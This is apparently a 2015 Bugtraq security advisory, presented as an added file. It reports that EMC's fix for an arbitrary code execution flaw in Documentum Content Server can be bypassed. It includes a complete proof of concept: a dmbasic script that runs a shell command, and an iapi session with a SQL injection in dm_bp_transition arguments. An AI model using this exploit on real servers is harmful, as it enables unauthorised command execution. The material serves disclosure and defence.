@@ -1,0 +1,169 @@
+
+Date: Thu, 9 Jul 2015 09:45:30 +1000
+From: <andrew@...filov.tel>
+To: "Bugtraq" <bugtraq@...urityfocus.com>
+Subject: Extra information for CVE-2014-2513 - EMC Documentum Content Server: arbitrary code execution
+
+Product: EMC Documentum Content Server
+Vendor: EMC
+Version: ANY
+CVE: N/A
+Risk: High
+Status: public/not fixed
+
+On November 2013 I discovered vulnerability in EMC Documentum Content Server
+which allow authenticated user to execute arbitrary commands using
+dm_bp_transition docbase method (for detailed description see
+VRF#HUFPRMOP.txt).
+
+On July 2014 vendor announced ESA-2014-064 which was claiming that
+vulnerability has been remediated.
+
+On November 2014 fix was contested  (there was significant delay after
+ESA-2014-064 because vendor constantly fails to provide status of reported
+vulnerabilities) by providing another proof of concept, description provided
+to CERT/CC (another CNA was chosen because vendor fails to communicate) was:
+
+=================================8<================================
+I have tried to reproduce PoC, described in VRF#HUFPRMOP, and got following
+error:
+
+[ErrorCode] 1000 [Parameter] 0801fd08805c9dfe [ServerError] Unexpected
+error: [DM_API_W_NO_MATCH]warning:  "There was no match in the
+docbase for the qualification: dm_procedure where r_object_id =
+'0801fd08805c9dfe'"
+
+Such behaviour means that EMC tried to remediate a security issue by
+“checking” object type of supplied object:
+
+Connected to Documentum Server running Release 6.7.2190.0198  Linux.Oracle
+Session id is s0
+API> id,c,dm_procedure where r_object_id = '0801fd08805c9dfe'
+...
+[DM_API_W_NO_MATCH]warning:  "There was no match in the docbase for the
+  qualification: dm_procedure where r_object_id = '0801fd08805c9dfe'"
+
+API> Bye
+
+bin]$ strings dmbasic| grep dm_procedure
+id,%s,dm_procedure where object_name = '%s' and folder('%s')
+id,%s,dm_procedure where r_object_id = '%s'
+# old version of dmbasic binary
+bin]$ strings dmbasic| grep dm_procedure
+bin]$
+
+So, the fix was implemented in dmbasic binary, the problem is neither 6.7
+SP2 P15 nor 6.7 SP1 P28 patches contain dmbasic binary - the first patch
+that was shipped with dmbasic binary was 6.7SP2 P17. Moreover, the
+issue is still reproducible because introduced check could be bypassed
+using SQL injection:
+
+~]$ cat test.ebs
+Public Function EntryCriteria(ByVal SessionId As String,_
+ByVal ObjectId As String,_
+ByVal UserName As String,_
+ByVal TargetState As String,_
+ByRef ErrorString As String) As Boolean
+t = ShellSync("echo dm_bp_transition_has_vulnerability > /tmp/test")
+EntryCriteria=True
+End Function
+~]$ cat /tmp/test
+cat: /tmp/test: No such file or directory
+
+~]$ iapi
+Please enter a docbase name (docubase): repo
+Please enter a user (dmadmin): test01
+Please enter password for test01:
+
+
+       EMC Documentum iapi - Interactive API interface
+       (c) Copyright EMC Corp., 1992 - 2011
+       All rights reserved.
+       Client Library Release 6.7.2190.0142
+
+
+Connecting to Server using docbase repo
+[DM_SESSION_I_SESSION_START]info:  "Session 0101fd088014000c started for
+  user test01."
+
+
+Connected to Documentum Server running Release 6.7.2190.0198  Linux.Oracle
+Session id is s0
+API> create,c,dm_sysobject
+...
+0801fd08805c9dfe
+API> set,c,l,object_name
+SET> test
+...
+OK
+API> setfile,c,l,test.ebs,crtext
+...
+OK
+API> save,c,l
+...
+OK
+API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
+         repo repo dmadmin "" 0000000000000000 0000000000000000
+         0000000000000000 "0801fd08805c9dfe,'' union select r_object_id
+         from  dm_sysobject where r_object_id=''0801fd08805c9dfe"
+         0000000000000000  0000000000000000 0000000000000000 ""
+         0 0 T F T T dmadmin 0000000000000000'
+
+...
+
+(1 row affected)
+
+API> Bye
+~]$ cat /tmp/test
+dm_bp_transition_has_vulnerability
+~]$
+
+Here ‘union …’ allows to bypass check based on "id" call:
+
+Connected to Documentum Server running Release 6.7.2190.0198  Linux.Oracle
+Session id is s0
+API> id,c,dm_procedure where r_object_id='0801fd08805c9dfe,' union
+          select r_object_id from dm_sysobject where
+          r_object_id='0801fd08805c9dfe'
+...
+0801fd08805c9dfe
+API> apply,c,,GET_LAST_SQL
+...
+q0
+API> next,c,q0
+...
+OK
+API> get,c,q0,result
+...
+
+select all dm_procedure.r_object_id from dm_procedure_sp  dm_procedure where
+     ((dm_procedure.r_object_id='0801fd08805c9dfe,')) and
+     (dm_procedure.i_has_folder = 1 and dm_procedure.i_is_deleted = 0)
+     union select all dm_sysobject.r_object_id from dm_sysobject_sp
+     dm_sysobject where ((dm_sysobject.r_object_id= '0801fd08805c9dfe'))
+     and (dm_sysobject.i_has_folder = 1 and dm_sysobject.i_is_deleted = 0)
+
+API> close,c,q0
+...
+OK
+
+Comma is required to bypass error in fetch call:
+API> fetch,c,0801fd08805c9dfe' union select r_object_id from
+            dm_sysobject where r_object_id='0801fd08805c9dfe
+...
+[DM_API_E_BADID]error:  "Bad ID given: 0801fd08805c9dfe' union
+            select r_object_id from dm_sysobject where r_object_id=
+            '0801fd08805c9dfe"
+
+
+API> fetch,c,0801fd08805c9dfe,' union select r_object_id from
+            dm_sysobject where r_object_id='0801fd08805c9dfe
+...
+OK
+=================================>8================================
+
+__
+Regards,
+Andrey B. Panfilov 
+
+View attachment "VRF#HUFPRMOP.txt" of type "text/plain" (5610 bytes)
